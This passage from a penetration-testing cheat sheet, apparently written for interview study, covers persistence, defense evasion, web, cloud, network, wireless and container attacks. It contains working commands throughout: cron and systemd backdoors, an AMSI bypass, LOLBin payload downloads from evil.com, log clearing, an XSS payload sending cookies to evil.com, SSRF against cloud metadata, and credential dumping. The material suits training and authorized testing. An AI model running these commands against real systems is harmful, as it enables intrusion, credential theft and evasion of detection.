(crontab -l; echo "* * * * * /tmp/backdoor.sh") | crontab -

# Or write to cron.d
echo "* * * * * root /tmp/backdoor.sh" > /etc/cron.d/backdoor
```

---

#### Systemd Service

```bash
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor

[Service]
ExecStart=/bin/bash /tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

---

## 🎭 Defense Evasion

### AV/EDR Bypass

#### AMSI Bypass Techniques

```powershell
# Simple (detected now)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Memory patching
# Force 'AmsiScanBuffer' to always return clean
```

**Modern approaches**:

- Obfuscated bypasses
- Reflection
- .NET version loading tricks

---

#### Common Evasion Techniques

1. **Process Injection** - Inject into legitimate process
2. **Unhooking** - Remove EDR hooks from ntdll
3. **Direct Syscalls** - Bypass userland hooks entirely
4. **Reflective Loading** - Load in memory, no disk
5. **PPID Spoofing** - Fake parent process
6. **ETW Patching** - Blind telemetry

---

#### Living Off the Land (LOLBins)

Common abuse:

```cmd
# Download with certutil
certutil -urlcache -split -f http://evil.com/shell.exe

# Execute with mshta
mshta http://evil.com/shell.hta

# PowerShell without powershell.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.xml
```

**Resources**: LOLBAS Project, GTFOBins

---

### Log Evasion

#### Clear Windows Event Logs

```cmd
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# PowerShell
Clear-EventLog -LogName Security, System, Application
```

---

## 🌐 Web Application Security

### SQL Injection

#### SQLi Types

| Type                 | Detection                   | Exploitation           |
| -------------------- | --------------------------- | ---------------------- |
| **Error-based**      | Visible error messages      | Extract data in errors |
| **Union-based**      | UNION SELECT works          | Combine results        |
| **Blind Boolean**    | True/false responses differ | Binary search          |
| **Blind Time-based** | Response time varies        | SLEEP() delays         |
| **Out-of-band**      | DNS/HTTP callbacks          | External channel       |

---

#### SQLmap Usage

```bash
# Basic
sqlmap -u "http://target.com/page?id=1" --dbs

# With POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# With cookie/headers
sqlmap -u "http://target.com/page?id=1" --cookie="session=xyz" --dbs

# Dump everything
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# Get shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

### XSS (Cross-Site Scripting)

#### XSS Types

| Type          | Storage          | Execution               |
| ------------- | ---------------- | ----------------------- |
| **Stored**    | In database      | On page load            |
| **Reflected** | In URL/request   | On click                |
| **DOM-based** | Client-side only | JavaScript manipulation |

---

#### XSS Payloads

```javascript
// Basic test
<script>alert('XSS')</script>

// Cookie stealing
<script>document.location='http://evil.com/steal?c='+document.cookie</script>

// Event handlers
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

// Filter bypass
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
```

---

### SSRF (Server-Side Request Forgery)

#### SSRF Exploitation

```bash
# Hit internal services
http://target.com/fetch?url=http://localhost:8080/admin

# Cloud metadata (AWS)
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# File read
http://target.com/fetch?url=file:///etc/passwd

# Internal network scanning
http://target.com/fetch?url=http://192.168.1.1:22
```

---

### JWT Attacks

```bash
# None algorithm
# Change "alg":"HS256" to "alg":"none"
# Remove signature

# Weak secret
hashcat -m 16500 jwt.txt rockyou.txt

# Key confusion (RS256 to HS256)
# Sign with public key as HMAC secret

# Tool: jwt_tool
python3 jwt_tool.py <token> -C -d rockyou.txt  # Crack
python3 jwt_tool.py <token> -X a               # Test attacks
```

---

## ☁️ Cloud Security

### AWS Exploitation

#### AWS Metadata Service

```bash
# IMDSv1 (easy SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>

# IMDSv2 (requires token - harder SSRF)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

---

#### S3 Bucket Enumeration

```bash
# Check if bucket exists
aws s3 ls s3://company-backup --no-sign-request

# List contents
aws s3 ls s3://company-backup/ --recursive --no-sign-request

# Download
aws s3 cp s3://company-backup/secrets.txt .

# Tools: S3Scanner, bucket_finder
```

---

#### AWS Privilege Escalation Paths

1. **IAM:CreateAccessKey** - Create keys for other users
2. **IAM:PassRole + Lambda** - Create Lambda with assumed role
3. **EC2:RunInstances + PassRole** - Launch EC2 with role
4. **SSM:SendCommand** - Execute on managed instances
5. **Lambda:UpdateFunctionCode** - Inject into existing Lambda

**Tools**: Pacu, ScoutSuite, Prowler

---

### Azure Exploitation

#### Azure AD Enumeration

```bash
# ROADtools
roadrecon gather -d company.onmicrosoft.com
roadrecon gui

# AADInternals
Import-Module AADInternals
Get-AADIntLoginInformation -UserName user@company.com

# AzureHound (BloodHound for Azure)
azurehound list -u user -p pass -t tenant
```

---

## 📡 Network Attacks

### NTLM Relay

#### Responder + ntlmrelayx

```bash
# Start Responder (disable SMB and HTTP)
responder -I eth0 -dwF

# Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support -socks

# Or execute commands
ntlmrelayx.py -tf targets.txt -c "whoami"
```

---

### IPv6 Attacks (mitm6)

```bash
# When IPv6 not configured, mitm6 provides DNS
mitm6 -d target.local

# Relay captured auth
ntlmrelayx.py -wh attacker-wpad -6 -t ldaps://dc.target.local
```

---

## 📶 Wireless Security

### WPA/WPA2 Attacks

```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng wlan0mon
airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon

# Deauth to force reconnect
aireplay-ng -0 5 -a <bssid> wlan0mon

# Crack handshake
aircrack-ng capture.cap -w rockyou.txt

# Or with hashcat
hcxpcapngtool capture.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

### PMKID Attack (Clientless)

```bash
# Capture PMKID (no client needed!)
hcxdumptool -i wlan0 --enable_status=1 -o dump.pcapng

# Convert
hcxpcapngtool dump.pcapng -o pmkid.hc22000

# Crack
hashcat -m 22000 pmkid.hc22000 rockyou.txt
```

---

## 🐳 Container & Kubernetes Security

### Docker Escape

#### Docker Socket Abuse

```bash
# If /var/run/docker.sock is mounted
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host bash
```

#### Privileged Container Escape

```bash
# If privileged, can access host devices
mkdir /mnt/host
mount /dev/sda1 /mnt/host
ls /mnt/host
```

---

### Kubernetes Attacks

```bash
# Check current permissions
kubectl auth can-i --list

# List secrets
kubectl get secrets -A
kubectl get secret <name> -o jsonpath='{.data}'

# Execute in pods
kubectl exec -it <pod> -- /bin/bash

# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## 🛠️ Tools & Frameworks

### C2 Framework Comparison

| Framework         | Type        | Highlights                      |
| ----------------- | ----------- | ------------------------------- |
| **Cobalt Strike** | Commercial  | Industry standard, Malleable C2 |
| **Sliver**        | Open-source | Modern, multi-platform          |
| **Havoc**         | Open-source | Cobalt Strike alternative       |
| **Mythic**        | Open-source | Modular, multi-agent            |
| **Empire**        | Open-source | PowerShell/Python agents        |

---

### Impacket Suite

```bash
# Remote execution
psexec.py domain/user:pass@target
wmiexec.py domain/user:pass@target
smbexec.py domain/user:pass@target
atexec.py domain/user:pass@target "command"

# Credential attacks
secretsdump.py domain/user:pass@target
GetUserSPNs.py domain/user:pass -dc-ip DC
GetNPUsers.py domain/ -usersfile users.txt -no-pass

# Kerberos
ticketer.py -nthash HASH -domain-sid SID -domain domain.local admin
getST.py -spn service/target -impersonate admin domain/user -hashes :hash
```

---

## 📝 Reporting & Documentation

### Pentest Report Structure

1. **Executive Summary** - Business impact, risk ratings
2. **Scope & Methodology** - What was tested
3. **Findings** - Detailed vulnerabilities
4. **Risk Ratings** - CVSS scores, business impact
5. **Remediation** - Fix recommendations
6. **Appendices** - Evidence, data

---

### CVSS Scoring

| Score      | Severity |
| ---------- | -------- |
| 0.0        | None     |
| 0.1 - 3.9  | Low      |
| 4.0 - 6.9  | Medium   |
| 7.0 - 8.9  | High     |
| 9.0 - 10.0 | Critical |

---

## ⚖️ Legal & Ethics

### Pre-Engagement Musts

1. **Written authorization** - Signed scope document
2. **Rules of Engagement** - What's allowed
3. **Emergency contacts** - Who to call
4. **Boundaries** - IP ranges, systems, timing
5. **Third-party considerations** - Cloud providers, shared hosts
6. **Data handling** - How to handle sensitive data

---

### Responsible Disclosure

1. Report to vendor first
2. Provide reasonable time (90 days standard)
3. Don't exploit or share before fix
4. Coordinate disclosure timing
5. Document everything

---

## 📋 Methodology & Process

### Pentest Phases

```
┌─────────────┐   ┌──────────────┐   ┌─────────────┐
│ Scoping &   │──▶│ Reconnaissance│──▶│ Enumeration │
│ Pre-engage  │   │ & OSINT      │   │             │
└─────────────┘   └──────────────┘   └──────┬──────┘
                                            │
┌─────────────┐   ┌──────────────┐   ┌──────▼──────┐
│ Reporting   │◀──│ Post-Exploit │◀──│ Exploitation│
│             │   │ & Pivoting   │   │             │
└─────────────┘   └──────────────┘   └─────────────┘
```

---

## 🎓 Scenario-Based Answers

### SQL Injection No Shell

**Scenario**: Found SQLi but can't get shell
**Answer**:

1. Extract all accessible data (credentials, secrets)
2. Try file write to web root (`INTO OUTFILE`)
3. Check for stacked queries → execute commands
4. Use out-of-band techniques (DNS exfil)
5. Look for other paths with extracted creds

---

### Low Privilege Escalation Process

**Scenario**: Stuck with netcat shell, need root
**Answer**:

1. Stabilize shell first (`python3 -c 'import pty...'`)
2. Run LinPEAS/WinPEAS for auto-enum
3. Check sudo permissions (`sudo -l`)
4. Look for SUID/capabilities
5. Check cron jobs and writable files
6. Kernel exploits as last resort

---

### Workstation But No DC Access

**Scenario**: Compromised workstation, can't reach DC
**Answer**:

1. Enumerate what you CAN access
2. Dump local credentials (SAM, lsass)
3. Look for cached domain credentials
4. Check for PSRemoting/WMI to other systems
5. Pivot through accessible hosts
6. Look for VPN/jump host access

---

### 24-Hour Internal Pentest Priority

**Scenario**: Only 24 hours for internal test
**Answer**:

1. **Hour 0-2**: Quick wins - Responder, SMB signing check
2. **Hour 2-6**: AD enumeration - BloodHound, share hunting
3. **Hour 6-12**: Attack paths - Kerberoast, AS-REP roast
4. **Hour 12-18**: Exploitation - Use found creds, relay
5. **Hour 18-22**: Pivot and escalate
6. **Hour 22-24**: Documentation, cleanup

---

## 💡 Conceptual & Theory

### MITRE ATT&CK Framework

**What**: Knowledge base of adversary tactics and techniques
**Structure**:

- **Tactics** = WHY (goals)
- **Techniques** = HOW (methods)
- **Procedures** = Specific implementation

**Tactics (in order)**:

1. Reconnaissance
2. Resource Development
3. Initial Access
4. Execution
5. Persistence
6. Privilege Escalation
7. Defense Evasion
8. Credential Access
9. Discovery
10. Lateral Movement
11. Collection
12. Command and Control
13. Exfiltration
14. Impact

---

### Cyber Kill Chain

1. **Reconnaissance** - Target research
2. **Weaponization** - Create payload
3. **Delivery** - Send to target
4. **Exploitation** - Trigger vulnerability
5. **Installation** - Install malware
6. **Command & Control** - Establish C2
7. **Actions on Objectives** - Achieve goal

---

### Red Team vs Pentest

| Pentest                | Red Team                |
| ---------------------- | ----------------------- |
| Find vulnerabilities   | Test detection/response |
| Comprehensive coverage | Targeted objectives     |
| Shorter timeframe      | Extended engagement     |
| Report all findings    | Focus on goals          |
| Limited evasion        | Full stealth            |

---

### Kerberos Authentication Flow

```
┌──────┐     1. AS-REQ (Username)      ┌────┐
│Client├────────────────────────────────▶│ KDC │
│      │◀────────────────────────────────┤    │
│      │     2. AS-REP (TGT)           │    │
│      │                                │    │
│      │     3. TGS-REQ (TGT + SPN)    │    │
│      ├────────────────────────────────▶│    │
│      │◀────────────────────────────────┤    │
│      │     4. TGS-REP (TGS)          └────┘
│      │
│      │     5. AP-REQ (TGS)           ┌───────┐
│      ├────────────────────────────────▶│Service│
└──────┘                                └───────┘
```

---

### NTLM Authentication Flow

```
┌──────┐     1. NEGOTIATE              ┌──────┐
│Client├────────────────────────────────▶│Server│
│      │◀────────────────────────────────┤      │
│      │     2. CHALLENGE              │      │
│      │                                │      │
│      │     3. AUTHENTICATE           │      │
│      │     (Hash + Challenge)        │      │
│      ├────────────────────────────────▶│      │
│      │◀────────────────────────────────┤      │
│      │     4. SUCCESS/FAIL           │      │
└──────┘                                └──────┘
```

**Why PTH works**: Hash IS the credential - no plaintext needed

---

### Defense in Depth

**What**: Multiple layers of security controls
**Layers**:

- **Physical** - Locks, badges
- **Network** - Firewalls, segmentation
- **Host** - AV, EDR, patching
- **Application** - Input validation, auth
- **Data** - Encryption, DLP
- **User** - Training, policies

**Analogy**: Castle walls, moat, guards, locks

---

### Least Privilege Principle

**What**: Users/processes get minimum permissions needed
**Examples**:

- No admin rights for daily work
- Service accounts scoped to function
- Database users limited to specific tables
- Network segmentation

---

## 🎯 Quick Reference Commands

### Enumeration Cheat Sheet

```bash
# Domain users
net user /domain
Get-DomainUser

# Domain groups
net group /domain
Get-DomainGroup -AdminCount

# Shares
net view \\target
Find-DomainShare

# Sessions
net session
Get-NetSession

# Logged on users
query user
Get-NetLoggedon
```

---

### Quick Wins Checklist

- [ ] Responder running for NTLM captures
- [ ] SMB signing disabled = relay
- [ ] AS-REP roastable accounts
- [ ] Kerberoastable SPNs
- [ ] Password spray common passwords
- [ ] SYSVOL/NETLOGON scripts
- [ ] Check for shared local admin passwords

---

_Generated from the Pentester Playbook - 2026 Ultimate Edition_
_Optimized for interview memorization and quick reference_
